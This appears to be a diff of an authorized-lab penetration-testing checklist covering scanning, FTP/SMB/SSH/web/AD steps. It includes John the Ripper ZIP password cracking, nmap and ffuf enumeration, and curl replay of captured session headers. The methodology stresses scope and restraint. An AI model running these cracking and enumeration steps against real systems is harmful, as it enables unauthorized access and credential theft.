-and 1 MiB selected-member limits. If a passphrase is already known, use ART-02.
-
-Choose one finite local wordlist and a positive time budget before starting.
-Record its hash and line count privately. An unterminated last line adds one
-candidate beyond `wc -l`; this count is an input extent, not a guess counter.
-
 ```bash
-command -v zip2john john
-stat -c '%F %s bytes %a %U:%G %n' -- '<absolute-private-ZIP-copy>' '<absolute-selected-wordlist>'
-sha256sum -- '<absolute-private-ZIP-copy>' '<absolute-selected-wordlist>'
-wc -l -- '<absolute-selected-wordlist>'
+zip2john -o '<MEMBER>' '<ZIP>' > archive.hash
+john --format=pkzip --wordlist='<WORDLIST>' --rules=none --max-run-time=<SECONDS> archive.hash
+john --show --format=pkzip archive.hash
 ```
 
-Use ordinary regular files and a trusted private parent. Create one **new** run
-directory; if `mkdir` fails or the path already exists, stop, do not reuse it:
-
-```bash
-mkdir -m 0700 -- '<new-absolute-private-recovery-directory>'
-```
-
-Convert only the observed member. Paths beginning with `-` are not valid
-substitutions; use an absolute archive path and a non-option relative member.
-
-```bash
-(umask 077; set -C; zip2john -o '<exact-listed-encrypted-relative-member>' '<absolute-private-ZIP-copy>' > '<same-private-recovery-directory>/archive.hash' 2> '<same-private-recovery-directory>/extract.err')
-printf 'Conversion exit: %s\n' "$?"
-test -s '<same-private-recovery-directory>/archive.hash'
-head -c 8192 -- '<same-private-recovery-directory>/extract.err' | cat -v
-```
-
-Continue only after conversion exit zero and a nonempty hash file. Do not print
-the hash into shared notes; it may contain archive data. Conversion failure or
-unsupported encryption goes to PAUSE-COVERAGE, preserving any partial local files.
-
-Run one foreground wordlist attempt. Replace the budget with positive integer
-seconds. `--rules=none` selects the supplied words without mangling. There is no
-default batch/incremental mode, automatic resume, added wordlist or network step.
-Do not start another run in this directory or against these same session files:
-
-```bash
-(umask 077; OMP_NUM_THREADS=1 john --format=pkzip --wordlist='<absolute-selected-wordlist>' --rules=none --max-run-time=<positive-budget-seconds> --pot='<same-private-recovery-directory>/john.pot' --session='<same-private-recovery-directory>/run' --verbosity=1 '<same-private-recovery-directory>/archive.hash')
-printf 'Recovery exit: %s\n' "$?"
-```
-
-Press Ctrl+C once to stop early; wait for the process to return. A stopped or
-time-limited attempt does not exhaust the list. Keep loaded-hash count, actual
-tested extent and any unsupported-format/error text, never infer success from
-the exit code alone. Inspect only this run's recovered result privately:
-
-```bash
-(umask 077; set -C; john --show --format=pkzip --pot='<same-private-recovery-directory>/john.pot' '<same-private-recovery-directory>/archive.hash' > '<same-private-recovery-directory>/recovered.txt')
-printf 'Result exit: %s\n' "$?"
-head -c 8192 -- '<same-private-recovery-directory>/recovered.txt' | cat -v
-```
-
-| Observed result | Next choice |
+| Result | Next |
 | --- | --- |
-| One candidate reported for the selected member | **ART-02**, entering that candidate at its password prompt. Only a complete CRC-checked member read confirms it. Do not use it as a login automatically. |
-| Member read fails with that candidate | Keep the failure separate from John's report; **PAUSE-COVERAGE** for hash/member/format consistency. No automatic retry or larger sweep. |
-| No recovery after the selected list completes | Record only this list's extent; **NET-05** or **PAUSE-COVERAGE** for another observed lead. Do not claim the archive uncrackable. |
-| Time budget or operator interruption | Record partial extent; **PAUSE-COVERAGE**. A later attempt needs a new explicit decision and budget, not automatic `--restore`. |
-| No hashes loaded, incompatible build/format, malformed archive or tool error | **PAUSE-COVERAGE** or **GAP-ACCESS** for the exact unsupported format. Empty output is not evidence of a wrong passphrase. |
-
-Retain only needed private evidence. `john.pot`, `recovered.txt`, hash,
-logs and recovery state are sensitive. When this process has exited and these
-files are no longer needed, inventory the exact run directory and remove only
-its named outputs. Missing optional files may report errors; inspect those
-errors rather than claiming cleanup merely because `rm` ran:
-
-```bash
-find '<same-private-recovery-directory>' -mindepth 1 -maxdepth 1 -printf '%f %y\n' | cat -v
-rm -i -- '<same-private-recovery-directory>/archive.hash' '<same-private-recovery-directory>/extract.err' '<same-private-recovery-directory>/john.pot' '<same-private-recovery-directory>/run.log' '<same-private-recovery-directory>/run.rec' '<same-private-recovery-directory>/recovered.txt'
-rmdir -- '<same-private-recovery-directory>'
-test ! -e '<same-private-recovery-directory>' && printf 'Recovery directory absent\n'
-```
-
-Leave unlisted files or a nonempty directory untouched and inspect them before
-any further removal. The original ZIP, selected wordlist and ART-02
-member copy are not removed here. No target file, account or listener changed.
+| Candidate recovered | **ART-02** with it; only a full member read confirms. |
+| List exhausted | **NET-05** or **PAUSE-COVERAGE**. |
+| Interrupted | **PAUSE-COVERAGE**; no automatic resume. |
+| Format unsupported | **GAP-ACCESS**. |
 
 # linux
 
@@ -8884,1157 +4208,305 @@ changing the payload or scheduler.
 
 # Explanations and troubleshooting
 
-## NET-01 Check connectivity and route context
-
-TARGET_IP is the assigned address, not an inferred hostname or a newly discovered neighbor. Verify the current VPN/interface and `ip route get` source address against the assigned scope. An ICMP reply establishes only this protocol and route at this time. With no reply, continue to a bounded TCP scan when scope and route are sound; do not call the host down. If local routing fails, repair the VPN or target entry before contacting anything else. Do not copy target-specific output into reusable checklist content.
-
-The default is one bounded ping against the assigned IP, not a local interface
-inventory or a Python address check. `-c 3` stops after three probes; one reply
-is enough to establish an ICMP response at that time. A missing reply cannot
-establish that TCP services are absent. If the command reports a local route
-error or a VPN reconnect changes source context, use `ip route get '<IP_ADDRESS>'`
-and `ip -brief address` to diagnose that specific problem. Do not scan neighbors
-revealed by route output. See the
-[iputils ping manual](https://manpages.debian.org/trixie/iputils-ping/ping.8.en.html).
-
-## NET-02 Discover TCP listeners
-
-These two commands answer the same port-coverage question. The early result lets you start focused work while the full range finishes. The displayed state applies only to the scanned transport and ports. -Pn skips Nmap host discovery; it does not bypass filtering or create a route. Use it only after checking the assigned target and local route. Preserve the exact scan extent and whether the result was a direct command, supplied artifact or reviewed import.
-
-[Nmap's host-discovery manual](https://nmap.org/book/man-host-discovery.html)
-describes different privileged/unprivileged defaults. `-Pn` skips that selection
-stage and attempts the chosen scan on this one target. On directly connected
-Ethernet, address-resolution traffic can still occur. It neither creates a route
-nor proves packets crossed a firewall. Do not call discovery failure an ICMP-only
-failure or silently inflate a supplied result's extent.
-
-[Nmap output options](https://nmap.org/book/man-output.html) document that
-`-oN` overwrites an existing file. Preserve earlier `results.txt` before another scan. `-p-`
-covers TCP ports 1 through 65535, not UDP. Privileged Nmap defaults to SYN
-scanning; `-sT` would force a connect scan. `-sC` runs default scripts, which
-can have side effects, so this full scan belongs on the assigned private lab
-box only. `-T4` suits a reliable lab link; a lossy or rate-limited result may
-need a narrower, slower repeat. Service text is a lead, not proof of a flaw.
-
-## NET-03 Identify observed TCP services
-
-TCP_PORTS is a comma-separated list of open TCP ports from NET-02, not ports guessed from a service name. A TLS-wrapped or nonstandard-port service may need a native-client confirmation. If the full TCP scan later finds more ports, apply this decision only to those new endpoints. Do not turn scanner scripts, banner text or a database version into a success or vulnerability claim.
-
-The retained runtime NET-03 route led through NET-04 even with an identified
-TCP service. This working edition sends the NET-02 service result directly to
-NET-05; NET-03 is only a targeted identity check when the first result leaves
-a specific question. UDP stays untested until a question calls for it. Nmap normally
-gates version detection on its own host-discovery result. The selected `-Pn`
-variant skips that gate for the one assigned target; it does not prove the port
-still answers or bypass filtering. See [Nmap host discovery](https://nmap.org/book/man-host-discovery.html)
-and [version detection](https://nmap.org/book/vscan-examples.html).
-
-If the probe stops at host discovery, confirm `ip route get '<IP_ADDRESS>'`
-before the one `-Pn` alternative. A wrong or changed VPN route is PAUSE-ROUTE,
-not a reason to add more flags. If an endpoint's identity is still unclear,
-preserve its raw response and choose one matching native-protocol question;
-another unchanged version scan is unlikely to resolve it.
-
-## NET-04 Review UDP separately
-
-UDP_PORTS is a comma-separated set chosen from the assigned box and existing clues; 53 and 161 are common examples, not a default or comprehensive claim. The second command is an explicit broader 1-1024 scan and may be slow. Silence is ambiguous. A same-numbered TCP port says nothing about UDP. Keep the checked set, response type and deferral reason in the coverage record. Never silently omit this decision.
-
-Skipping discovery does not resolve an `open|filtered` result. A missing response
-can have several causes and a top-1024 scan is not universal UDP coverage.
-Review the actual response with the matching authored native-client question.
-If privileges or scope are unavailable, record the deferral and its revisit
-condition. Source review and Bash syntax are not live Nmap/VPN validation.
-
-If Nmap stops at host discovery, check `ip route get '<IP_ADDRESS>'` before
-using `-Pn`. If the `sudo` scan creates a root-owned local results file that
-you cannot read, inspect that exact file with `ls -l` and repair ownership only
-for that newly created regular file. No target artifact or listener is created
-by the scan; retaining the local results file is usually more useful than a
-default cleanup ritual. Record an interrupted scan as partial coverage.
-
-## NET-05 Choose a service to investigate
-
-NET-05 saves a scanner-reported lead and next checklist, not a confirmed service observation. Do not route an apparent Windows host to AD merely because SMB is open; seek domain-service context. Do not infer a web application solely from port 80 or 443. A service may create more than one lead, but work and record one decision at a time. A missing practical module is a coverage gap, not a recommendation to ignore the service. Record the endpoint, current hypothesis and why this next check is worth doing.
-
-## FTP-01 Check the observed FTP access boundary
-
-The shown curl form attempts anonymous FTP. Run it only when anonymous access is within the exercise's permission; do not use it to test guessed usernames or passwords. Do not put supplied passwords on a command line or in the reusable checklist. A 530-style denial is an authentication observation, not proof that the FTP endpoint has no useful files. Preserve the identity and exact directory that produced the result.
-
-The plain-FTP command is for a separately permitted supplied identity, not a
-retry after anonymous denial without permission. Curl's `--user` with only a
-username prompts for the password. A trailing slash lists the account's
-starting directory; the server may show different contents for another user.
-The data connection can fail after login, so keep that failure stage. Plain FTP
-does not protect the credential or listing in transit. See the
-[curl manual](https://curl.se/docs/manpage.html) and
-[FTP URL syntax](https://curl.se/docs/url-syntax.html).
-
-## FTP-02 Check one relevant FTP file
-
-Do not bulk-download a directory to satisfy this task. Files that look like credentials or private data belong in protected adventure state, not checklist text, terminal-review summaries or project memory. Reading a file does not establish write access. A file that names a web path, domain or account is a lead to verify in that context, not a new authorized target.
-
-The selected SSH handoff applies only after the file read completed and the
-operator confirmed permission for one exact account and endpoint. Keep the file
-path and read identity as provenance. A string resembling a username or secret
-does not authorize trying it. SSH-01 still checks host trust before SSH-02 tests
-the account; do not claim access from file content.
-An archive or private-key *copy* instead enters ART-01 for offline local triage;
-its filename alone is not a credential or application configuration.
-
-The read is one named RETR operation under the selected identity. FTP listing
-and retrieval use a data channel separate from login/control, so a login can
-succeed while a transfer stalls. Passive mode is explicit; skipping the PASV
-address keeps the connected host rather than following an alternate address
-supplied by the server. The one-megabyte and 30-second limits apply to this
-read; an incomplete copy is not an empty file. The local name is chosen by
-the operator, not taken from the server.
+## NET-01. What decides this step?
 
-The password is entered at curl's prompt. For observed FTPS, first use FTP-04's
-completed listing, then choose only the matching implicit or explicit read above.
-Do not reuse a plaintext example as fallback. The [curl manual](https://curl.se/docs/manpage.html)
-describes user prompts, URL globbing, FTP passive addressing, size limits and
-output handling. Installed-client behavior and live denied/partial outcomes
-still need a trial.
-
-## SMB-01 List shares for the current identity
-
-The shown command makes one no-password listing attempt. Keep guest mapping, true anonymous access and an authenticated identity separate. An administrative-looking share name does not establish administrative access. Do not put a supplied secret in command-line arguments or test it across other hosts. A domain string in an SMB banner is a clue for AD-01, not a verified controller or scope expansion.
-
-The supplied-identity command pins the observed server to the assigned IP and
-keeps the password out of argv. `-L` lists available shares for that identity;
-it does not open a share or prove file rights. The domain or local SAM context
-changes which account is tested. A referral to another server needs its own
-scope check. See the [Samba smbclient manual](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html).
-
-## SMB-02 Read a relevant SMB share path
-
-The shown command applies only to a no-password listing. With a supplied account, use a client method that keeps the secret out of command history and process arguments. Do not infer share read or write from smbclient's share list, from a directory name, or from an administrative-looking label. Record exact share and path context in protected adventure state. A file containing a credential-looking value is a candidate until separately validated for one justified service and identity.
-
-The same SSH handoff needs a completed named retrieval, the exact account and
-observed SSH endpoint on the assigned host, and permission for that one login.
-Share entry or a credential-looking string alone does not supply those facts.
-Keep the share/path and read identity with the clue. SSH-01 checks trust before
-SSH-02 tests access; a failed login leaves the file read intact as evidence.
-Use ART-01 first for a retrieved ZIP or private-key lead; do not bulk-extract
-share contents.
-
-The connection targets the pinned IP while retaining the observed server/share
-name. No-password access may be guest-mapped; do not label it a verified named
-user. Interactive commands avoid building a semicolon-separated string from a
-remote filename. A completed login or listing does not prove the later file
-retrieval succeeded. Record the transfer response alongside the hash. The
-request timeout is not a byte cap or session deadline.
+ICMP replies prove reachability, not open services.
 
-The [Samba smbclient manual](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
-describes identity prompts, address/port, request timeout and interactive
-`get`, `cd` and `quit`. Live client dialect, DFS, password denial and
-interrupted-transfer behavior still need prospective validation.
+## NET-02. What decides this step?
 
-## SSH-01 Check the observed SSH access boundary
+A full TCP scan is the coverage baseline; `-Pn` skips discovery, not filtering.
 
-A first-use host key is not independently verified by ssh-keyscan. Record its fingerprint with the assigned IP and port in protected adventure data and follow the exercise's trust instructions. Never use a changed key as a reason to disable host-key checking. This task does not test whether an account is valid or whether a shell exists. A remote-desktop or other management endpoint remains a separate GAP-SERVICE case, even if it shares an access objective.
+## NET-03. What decides this step?
 
-SSH-03 can change one observed firewall gate. It does not authenticate the
-server or account. Keep the existing host-trust procedure and one permitted
-authentication check; return to required closure even if login fails.
+One unclear port gets one native check; a version guess is a lead.
 
-## SSH-02 Verify one permitted SSH session
+## NET-04. What decides this step?
 
-A supplied password belongs in the client's interactive prompt or protected credential mechanism, never in a displayed command, process argument or reusable checklist. An SSH key must be authorized for this exact identity and host; do not disable trust checks for convenience. On Linux, `id`, `hostname` and `uname -s` help establish effective identity and OS. On Windows, use the corresponding native identity and hostname commands. Correlate the remote host with the assigned target; a container, jump host, forced command or SFTP-only channel may not be a usable host shell. Record the access context in protected adventure state. Revisit a denied identity only when the permitted account or endpoint context changes.
+UDP is spent only on a specific clue, and `open|filtered` is not open.
 
-This selected working body replaces the legacy SSH-02 presentation that named
-GAP-ACCESS for a verified Linux shell. The original runtime notes and route
-provenance remain in this later section.
+## NET-05. What decides this step?
 
-Use the host and effective identity returned inside the shell alongside the
-verified SSH endpoint. A banner alone can be misleading. If host attribution
-remains unclear, run the relevant address command in that same remote shell:
+The scan does not rank leads; pick one service and open its task.
 
-```bash
-ip -brief address
-```
+## FTP-01. What decides this step?
 
-```powershell
-ipconfig
-```
+A listing proves the login, not read access to a file.
 
-NAT can mean the visible interface differs from the assigned address. Resolve
-the exercise's topology rather than requiring textual IP equality or silently
-expanding scope. A forced command or SFTP-only channel may authenticate without
-offering a general shell. Missing `ip` does not establish Windows; preserve the
-available facts and uncertainty.
+## FTP-02. What decides this step?
 
-## WEB-01 Initial web triage
+One completed read is the evidence; a transfer alone is not execution.
 
-Use the exact scheme, hostname, port and current application base, without a trailing slash. The first request includes headers; check Location before following a redirect. robots.txt and sitemap.xml may publish useful routes, but a listed path is only a lead. Inspect View Source and Developer Tools > Network for forms, scripts, API routes and hostnames. Open referenced scripts and search for fetch, axios, route strings and field names. If curl works but the page looks blank, check failed JavaScript requests and assets. Record both status and body because a real 404 differs from a 200 page that says not found. Pause on 429 and respect Retry-After. For repeated 5xx or TLS errors, confirm the scheme, hostname, certificate and ordinary browser behavior before changing options. Keep each scheme, hostname, port and nested application base as a separate entry.
+## SMB-01. What decides this step?
 
-URL context: Current application base URL, including http:// or https://, hostname or TARGET_IP, optional :port and path, with no trailing slash. Example: http://192.0.2.10:8080/blog. The first command requests that base; the next two append /robots.txt and /sitemap.xml.
+Share names say nothing about permissions.
 
-The browser separates a document response from its rendering and subsequent
-script requests. Curl GET is not a substitute for an application's POST/API
-request or its session. Zero body bytes describe the captured response, not the
-server's implementation. A nonzero curl exit can leave partial headers or body;
-their presence does not establish a completed response. Header files can contain
-live cookies, so retain them only in protected adventure storage. Escaping
-control characters with cat -v does not redact secrets.
+## SMB-02. What decides this step?
 
-If an exact unauthenticated GET remains ambiguous and a retained header/body
-copy is needed, use a new private directory. Do not run this capture for every
-web lead. Stop if the directory already exists:
+Read one file with the same identity that listed the share.
 
-```bash
-mkdir -m 700 -- './http-response-<unique-run-id>'
-```
+## SSH-01. What decides this step?
 
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --dump-header './http-response-<same-run-id>/response.headers' \
-  --output './http-response-<same-run-id>/response.body' \
-  --write-out 'HTTP %{http_code}; type %{content_type}; bytes %{size_download}\n' \
-  '<exact-observed-read-only-get-url>'
-```
+Host key and account availability are separate prerequisites.
 
-Inspect curl's exit status before calling the response complete. Neither a
-partial file nor an HTTP error establishes the intended page. Inspect the
-bounded local copy without following redirects or bypassing TLS:
+## SSH-02. What decides this step?
 
-```bash
-head -c 8192 -- './http-response-<same-run-id>/response.headers' | cat -v
-wc -c -- './http-response-<same-run-id>/response.body'
-head -c 8192 -- './http-response-<same-run-id>/response.body' | cat -v
-```
+A login is not a shell until host and identity are attributed.
 
-After protecting any evidence that is needed, remove only this run's files:
+## WEB-01. What decides this step?
 
-```bash
-rm -i -- './http-response-<same-run-id>/response.headers' './http-response-<same-run-id>/response.body'
-rmdir -- './http-response-<same-run-id>'
-```
+Triage identifies the app and its visible functions before any payload.
 
-## WEB-04 Discover unlinked directories and files
+## WEB-04. What decides this step?
 
-Both alternatives use the medium directory list, the practical extension set and 50 threads from your original examples. Feroxbuster recurses into discovered paths; Gobuster checks one base at a time and writes gobuster.txt. Choose one first, then use the other only when filtering or recursion behavior leaves a specific gap. Confirm the wordlist exists and change extensions when the application identifies a different technology. Treat a downloaded image, audio file, archive or other static object as ART-01 input rather than an ordinary page; crawler byte counts are discovery hints, not local-file integrity evidence. If either tool reports wildcard or precheck behavior, compare curl -sS -i '<TARGET_URL>/unlikely-missing-7f32' with one real response. Record status, redirect, response length and identifying body text. A stable false response can support a status or length filter. A variable false response, including a handler that echoes the requested path, needs a content regex supported by the selected tool. For example, ffuf can use -fr 'CGI process file does not exist'. Do not run the extra request or switch tools by default. If repeated runs add no new evidence, record the bases, list and filters already checked, then move to another lead.
+Unlinked discovery needs a missing-path baseline to cut wildcard noise.
 
-URL context: Application base URL with no trailing slash or query. Example: http://192.0.2.10:8080/blog. The command adds a slash and a discovery path.
+## WEB-03. What decides this step?
 
-## WEB-03 Fingerprint the application
+Fingerprinting produces hints; only a response confirms a version.
 
-Level 1 uses a light fingerprinting request; -v provides the matching details. Redirect following is disabled so an unexpected destination is not scanned automatically. A server banner may identify the front-end proxy rather than the application. Preserve which TARGET_URL produced each product or version hint. Version text alone is insufficient to establish an applicable vulnerability.
+## WEB-06. What decides this step?
 
-URL context: URL of the working application page. Include a nested installation path if present. Example: http://192.0.2.10:8080/blog/. Keep the hostname if the site uses name-based hosting.
+Change one GET value and compare it with the normal response.
 
-## WEB-06 Inspect and replay an observed GET parameter
+## WEB-08. What decides this step?
 
-A parameter name identifies a field; its value is the supplied content. Read both from a working Network request. This template starts without a query and adds encoded fields with --get. With an existing query, preserve required fields and avoid duplicating the same name. Keep percent-encoded content intact rather than encoding it twice. Compare one ordinary value with the normal request, including method, status, body and redirect. An error or reflected value alone does not establish a vulnerability.
+Keep the captured method, content type and required fields.
 
-URL context: Exact observed page or endpoint, without an existing query for this template. Example: http://192.0.2.10:8080/search.php. --get and --data-urlencode add the query; preserve any other required fields.
+## WEB-05. What decides this step?
 
-The retained route returned to WEB-01 after every benign GET comparison. This
-working route prevents an unchanged triage loop while preserving other observed
-web requests as separate leads. A later new identity, application base or
-different input can reopen the exact affected WEB decision.
+`--resolve` tests one name without changing system DNS.
 
-## WEB-08 Inspect a form or API request
+## WEB-07. What decides this step?
 
-URL-encoded form: preserve POST, the receiving URL, encoding, every hidden/selector/action/submit field, session identity and a fresh anti-CSRF value from the working request. The displayed required and submit fields are examples; repeat --data-urlencode for every captured field and change only FIELD. Never turn a POST hypothesis into GET. JSON: inspect the captured request in Network or Repeater and preserve property names, data types and Content-Type. Multipart: preserve the browser-generated boundary, field names and file metadata; the plain form command is not interchangeable. Compare an ordinary search or preview with its original response. A 400 or 415 can indicate a malformed request or wrong media type. Match the working browser format before interpreting behavior.
+Parameter guessing applies only when the page implies an input.
 
-URL context: Exact URL receiving the observed form POST, not necessarily the page displaying the form. Example: http://192.0.2.10:8080/search. Use the Network request URL and retain required fields.
+## WEB-09. What decides this step?
 
-The retained ordinary URL-encoded comparison also returned to WEB-01. The
-working route leaves that completed question and keeps format failures on the
-existing WEB-08 path. Do not infer anything about JSON/multipart requests from
-one URL-encoded result.
+A permitted account opens the function; login is not permission.
 
-## WEB-05 Check name based hosting
+## WEB-10. What decides this step?
 
-The second example is HTTP-only and requires an authorized domain suffix plus a wordlist of labels, not full names. First request the same endpoint with Host: unlikely-missing-7f32.<DOMAIN> using curl -H and compare status, redirect and body. If the catch-all size is stable, optionally add -fs <BYTES>, then manually check candidates because real pages may have that size too. For HTTPS, Host header changes alone do not change TLS SNI; validate an observed name with --resolve and the hostname URL. For another TLS port, both the resolve entry and HTTPS URL must use that port. curl --resolve applies only to that command; the browser needs its own working name resolution.
+Read the upload request and delete route before creating a file.
 
-An observed hostname needs only the exact-origin check above. If an actual
-response or assignment suggests additional in-scope virtual hosts, obtain a
-clear scope boundary and compare an invented-host baseline before a bounded
-host-name search. This is not part of the ordinary WEB-05 path:
+## WEB-11. What decides this step?
 
-```bash
-ffuf -u 'http://<TARGET_IP>:<PORT>/' \
-  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-  -H 'Host: FUZZ.<DOMAIN>' -mc all -t 10 -rate 20 -maxtime 120
-```
+Inventory a confirmed CMS, then pick one matching local source.
 
-Confirm a candidate with the exact-origin command, not by the wordlist hit
-alone. An HTTPS request requires the observed hostname for SNI and certificate
-checks; a changed Host header against an IP URL is not an equivalent test.
+## WEB-12. What decides this step?
 
-## WEB-07 Discover missing GET parameter names
+WebDAV and default-file checks are read-only; a `DAV` header is a lead.
 
-FUZZ is literal tool syntax: leave it unchanged. It substitutes parameter names here, not values. The default is SecLists burp-parameter-names.txt from your draft. Both ffuf wordlists require the seclists package at /usr/share/seclists; check files during preparation and use a local copy if installed elsewhere. This template assumes no existing query; use & when retaining existing parameters. Compare the no-parameter response and an invented parameter before filtering. Dynamic bodies can make size filtering unreliable. A time-limited run may not finish the list; preserve incomplete coverage rather than claiming no parameters exist.
+## AD-01. What decides this step?
 
-URL context: Exact observed page without ? or an existing query. Example: http://192.0.2.10:8080/search.php. The command appends ?FUZZ=test. If preserving an existing query, change that separator to &.
+Domain and controller names come before any authentication.
 
-## WEB-09 Check authenticated functions
+## AD-02. What decides this step?
 
-Use an existing permitted account and confirm visible identity plus an ordinary account-only page. A cookie or 302 alone does not confirm login. If a saved request redirects to login, refresh the session through the normal UI. If only form submission fails, compare required fields and CSRF context with a fresh browser request. A 401 challenge differs from a form login; 403 may indicate insufficient permission. Keep the current account and role with the observation. Record blocked access separately from an absent feature.
+Each anonymous protocol read is separate; one denial says nothing about the others.
 
-The comparison keeps the request constant and changes only the observed session
-context. The browser's displayed identity and an ordinary account-only response
-provide the interpretation. Body hashes can differ because of CSRF tokens,
-timestamps or cosmetic personalization; they do not themselves prove a login or
-an authorization flaw. HttpOnly cookies can be visible in browser Network even
-when page JavaScript cannot read them. Authentication headers must come from the
-current request, not a token-shaped string recovered elsewhere.
+## AD-03. What decides this step?
 
-The curl header-file option sends its exact contents. It is not a domain-aware
-browser cookie store, so the same-origin check and absence of redirect following
-matter. Restrict these files to the adventure directory and remove them when no
-longer needed. Cookie rotation, device/session binding and per-request signatures
-can make a captured request unusable; that is a client-context question, not proof
-the supplied account is invalid. A browser-only replay in the normal UI remains
-valid when such a prerequisite cannot be reproduced safely in this template.
-
-Command options were checked against the [curl manual](https://curl.se/docs/manpage.html).
-The browser capture steps follow the [Chrome Network reference](https://developer.chrome.com/docs/devtools/network/reference).
-These support client mechanics, not authentication decisions for a particular
-application. Live session expiry, TLS, SSO, CSRF and app-specific role outcomes
-still need prospective validation.
-
-#### Optional same-origin response capture
-
-Use the following only when a signed-in page's response remains ambiguous and
-its exact same-origin GET must be compared with an anonymous baseline. The
-normal browser result above needs no copied credential or local response files.
-
-
-1. Sign in once through the application's **normal browser UI**, using the
-   supplied/permitted account. In Network, select one ordinary read-only account
-   page request, not login, logout, delete, a payment or another state-changing GET.
-2. Check the displayed identity and exact scheme/hostname/port. Copy the request
-   URL and, for cookie/token authentication, **only the single-line value** of
-   the observed `Cookie` or `Authorization` header. Never paste a complete captured
-   request or an unreviewed "Copy as curl" command into a shell.
-3. Use **Kali Bash** for the blocks below, in a protected adventure directory.
-   Require curl 8.4.0 or newer for the response-size limit. Preserve the observed
-   virtual-host name and trusted HTTPS certificate. Do not replace HTTPS with HTTP
-   or use `-k`; use the exercise's trusted CA setup when needed.
-
-Compare the URL's scheme, hostname and port with the browser request before
-sending a session header. Choose one new private directory name, then repeat
-it in every command:
-
-```bash
-curl --version
-mkdir -m 700 -- './web-context-<unique-run-id>'
-```
-
-Stop if directory creation failed, curl is too old, the hostname does not resolve
-to the assigned target, or the origin does not match the browser request. A URL
-containing a secret in its query needs a separately protected request form, not
-this argument-based example. No redirects will be followed.
-
-**Cookie or bearer header.** Choose the actual header name. For Authorization,
-enter its complete observed value such as `Bearer ...`, not just the token.
-
-Create a private header file and enter exactly one observed `Cookie: ...` or
-`Authorization: ...` line. Do not include a redirect destination or another
-origin. Inspect it locally and stop if it is empty, multiline or malformed:
-
-```bash
-( umask 077; : > './web-context-<same-run-id>/session.headers' )
-nano './web-context-<same-run-id>/session.headers'
-```
-
-Make one anonymous baseline for either authentication method:
-
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --dump-header './web-context-<same-run-id>/anonymous.headers' --output './web-context-<same-run-id>/anonymous.body' \
-  --write-out 'Anonymous HTTP status: %{http_code}\n' '<exact-read-only-account-page-url>'
-```
+One login validates one credential on one host.
 
-For the cookie/token method, make one authenticated request to the **same** URL.
-The private header file keeps the session value out of process arguments. Direct
-connections bypass inherited proxy settings; if your authorized lab requires a
-proxy, review that specific local proxy before adapting this block.
+## AD-04. What decides this step?
 
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --header '@./web-context-<same-run-id>/session.headers' \
-  --dump-header './web-context-<same-run-id>/authenticated.headers' --output './web-context-<same-run-id>/authenticated.body' \
-  --write-out 'Authenticated HTTP status: %{http_code}\n' '<same-read-only-account-page-url>'
-```
+Read one share file with the identity that authenticated.
 
-**HTTP Basic alternative.** Use only after the endpoint's actual challenge names
-Basic and the account is permitted there. Do not combine it with the cookie block.
-Use the same setup and anonymous baseline block above, then this authenticated
-GET instead. Use the username only, never `username:password` in the value below.
-Curl prompts for the supplied password:
+## AD-21. What decides this step?
 
-```bash
-curl --disable --globoff --proto '=http,https' --noproxy '*' \
-  -sS --connect-timeout 5 --max-filesize 1048576 \
-  --basic --user '<permitted-username>' \
-  --dump-header './web-context-<same-run-id>/authenticated.headers' --output './web-context-<same-run-id>/authenticated.body' \
-  --write-out 'Authenticated HTTP status: %{http_code}\n' '<same-read-only-account-page-url>'
-```
+ntds.dit needs the matching SYSTEM hive from the same backup.
 
-Do not use plain HTTP Basic across an untrusted path. A Digest/NTLM/Negotiate
-challenge needs its matching identity/protocol procedure, not arbitrary fallback.
+## AD-05. What decides this step?
 
-| Observation | Next choice |
-| --- | --- |
-| Same-host ordinary account page shows the expected identity; anonymous version differs as expected | Retain the account/role, request and response. Newly visible query to **WEB-06**, form/API to **WEB-08**, upload to **WEB-10**, CMS inventory to **WEB-11**. |
-| Both return the same public page | This resource did not prove authentication. Select an observed account-only page in the UI and repeat **WEB-09** only for that specific question. |
-| 302/303/307/308 to login, or login body | Inspect the private Location/body; do not follow blindly. Refresh through normal UI and replace the captured session once; **WEB-09**. |
-| Redirect to another origin, including SSO | Do not forward captured headers to it. Check scope and use the normal browser flow; **WEB-09**. |
-| 401 | Check the actual challenge, session expiration and account context; **WEB-09**, not guessed credentials. |
-| 403 while identity is independently confirmed | Record identity-specific denied permission. Another available function to **WEB-01**, or a specifically changed identity to the changed-context check. |
-| 200 containing error/login text, stale identity or unexplained body difference | HTTP success is not account proof. Compare with the current browser page; **WEB-09**. |
-| Curl nonzero, TLS error, size limit, timeout or 429 | Keep failure/partial response. Do not compare as complete. TLS/origin/route issue to **WEB-01**; rate-limit or missing coverage to **PAUSE-COVERAGE**. |
+Inventory users, computers and SPNs for targeted follow-up.
 
-Inspect private responses locally. They may contain Set-Cookie, tokens or personal
-data. Only for completed reads, compare hashes and, if needed, escaped text:
+## AD-06. What decides this step?
 
-```bash
-sha256sum -- './web-context-<same-run-id>/anonymous.body' './web-context-<same-run-id>/authenticated.body'
-# Optional local text comparison, not a standalone authentication test:
-# diff -u -- './web-context-<same-run-id>/anonymous.body' './web-context-<same-run-id>/authenticated.body' | head -n 80 | cat -v
-```
+GPP files either yield a candidate or send you back to SYSVOL.
 
-For form/API submission, use a **fresh working browser request** at WEB-08 and
-preserve method, media type, required fields and current CSRF context. Do not
-convert this GET block into a login or an upload by adding a guessed POST body.
-If only a form fails but the account page still works, investigate request/CSRF
-context rather than declaring the password invalid.
+## AD-07. What decides this step?
 
-Finish by signing out through the normal browser UI when the account session is
-no longer needed. Remove the header file even if you retain response evidence
-under private adventure evidence. It remains a live credential until expired/revoked. Confirm the
-chosen directory, then run **Kali Bash** cleanup for these exact local files:
+AS-REP and service tickets are alternatives, not a pair.
 
-```bash
-ls -la -- './web-context-<same-run-id>'
-rm -i -- './web-context-<same-run-id>/session.headers' \
-  './web-context-<same-run-id>/anonymous.headers' './web-context-<same-run-id>/anonymous.body' \
-  './web-context-<same-run-id>/authenticated.headers' './web-context-<same-run-id>/authenticated.body'
